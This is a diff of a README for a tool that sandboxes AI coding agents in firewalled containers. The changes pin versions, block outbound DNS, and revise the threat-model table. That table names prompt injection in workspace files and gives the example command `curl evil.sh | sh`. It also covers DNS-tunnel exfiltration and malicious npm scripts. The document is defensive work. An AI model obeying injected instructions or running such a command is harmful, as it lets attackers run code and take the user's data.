@@ -77,7 +77,7 @@ To build on top of a repo's existing Dockerfile instead of a base image tag:
 uv run project-sandbox /absolute/path/to/repo --dockerfile /absolute/path/to/repo/Dockerfile
 ```
 
-In this mode, `.project-sandbox/Dockerfile` starts with the existing Dockerfile contents and appends the sandbox runtime, firewall, OpenSpec, and installed coding agents. The build context defaults to the project root so existing `COPY` instructions keep working; use `--docker-context` if that Dockerfile expects a different context. If the source Dockerfile defines its own non-root user or UID/GID setup, project-sandbox removes those instructions, prints a warning, and creates its own `agent` user with UID 1000.
+In this mode, `.project-sandbox/Dockerfile` starts with the existing Dockerfile contents and appends the sandbox runtime, firewall, OpenSpec, and installed coding agents. The build context defaults to the project root so existing `COPY` instructions keep working; use `--docker-context` if that Dockerfile expects a different context. If the source Dockerfile defines its own non-root user or standalone UID/GID setup, project-sandbox removes those instructions, prints a warning, and creates its own `agent` user with UID 1000. If a `RUN` instruction mixes user-management commands with unrelated build steps, project-sandbox rejects it instead of silently dropping the unrelated work.
 
 ### Python + uv projects
 
@@ -89,7 +89,7 @@ runtime):
 ```dockerfile
 FROM python:3.11-slim
 
-COPY --from=ghcr.io/astral-sh/uv:latest /uv /usr/local/bin/uv
+COPY --from=ghcr.io/astral-sh/uv:0.11.23@sha256:d0a0a753ab981624b49c97abc98821c1c09f4ca69d1ef5cee69c501be3d88479 /uv /usr/local/bin/uv
 
 # Pre-populate the uv package cache with all project dependencies so the agent
 # can run `uv sync` / `uv run` inside the sandbox without reaching PyPI.
@@ -141,10 +141,10 @@ the resolved absolute path so two projects with the same directory name do not
 collide. Use `--image-tag` when you need a stable external tag, want to share a
 prebuilt image, or need to align with local image cleanup scripts.
 
-Generated images install `@fission-ai/openspec@latest`, which puts `openspec` on
-`PATH`. project-sandbox does not run `openspec init` or create OpenSpec workspace
-files automatically; run OpenSpec initialization commands inside the project only
-when that project should own those files.
+Generated images install a pinned `@fission-ai/openspec` version, which puts
+`openspec` on `PATH`. project-sandbox does not run `openspec init` or create
+OpenSpec workspace files automatically; run OpenSpec initialization commands
+inside the project only when that project should own those files.
 
 ## File layout
 
@@ -201,8 +201,9 @@ uv run project-sandbox \
   python:3.12-slim
 ```
 
-- `--prompt FILE` bind-mounts the file's parent directory read-only and reads
-  the prompt from `/project-sandbox-prompt/<name>`.
+- `--prompt FILE` copies the file into a private generated staging directory,
+  bind-mounts only that directory read-only, and reads the prompt from
+  `/project-sandbox-prompt/<name>`.
 - `--prompt-text "..."` writes the prompt under `.project-sandbox/prompts/`,
   bind-mounts that directory read-only, and reads it from
   `/project-sandbox-prompt/prompt.txt`.
@@ -223,9 +224,11 @@ A maliciously crafted file in the workspace (e.g. a prompt-injection in a README
 When the firewall is enabled (default), `init-firewall.sh` runs as root inside the container and:
 
 - Sets `iptables` and `ip6tables` policies to DROP.
-- Pins DNS to all resolvers listed in `/etc/resolv.conf` (closes the DNS-tunnel exfiltration gap in the upstream Anthropic devcontainer).
+- Pre-resolves allowlisted domains using the resolvers in `/etc/resolv.conf`,
+  pins the resulting addresses into `/etc/hosts` and `ipset`, then blocks
+  general outbound DNS to close DNS-tunnel exfiltration.
 - Allows GitHub's published IP ranges (fetched from `api.github.com/meta`), Claude/Anthropic endpoints (`api.anthropic.com`, `claude.ai`, `code.claude.com`, `platform.claude.com`), `api.openai.com`, `auth.openai.com`, and `chatgpt.com`.
-- In the devcontainer firewall variant only, allows the host gateway subnet so port-forwarding and IDE attach work. Direct CLI runs omit this host-network allowlist.
+- In the devcontainer firewall variant only, allows the host gateway address so port-forwarding and IDE attach work. Direct CLI runs omit this host-network allowlist.
 - Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable — the script exits with an error if both `ip6tables` and `sysctl` are unavailable.
 
 Domain allowlists are resolved once when the container starts, then pinned as IP
@@ -245,7 +248,7 @@ Customize:
 | Agent reads `~/.ssh`, `~/Library`, etc. | Arbitrary host home directories are not mounted by default. Apple `container` adds a VM boundary; Docker/Podman rely on the host's container isolation. |
 | Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable container or VM. |
 | Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist (default DROP + domain whitelist) for both IPv4 and IPv6. |
-| DNS tunneling exfiltration | DNS restricted to the container resolver(s) only. |
+| DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
 | Malicious npm post-install scripts | Run as UID 1000 inside the container; no access to unmounted host paths. |
 | Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). |
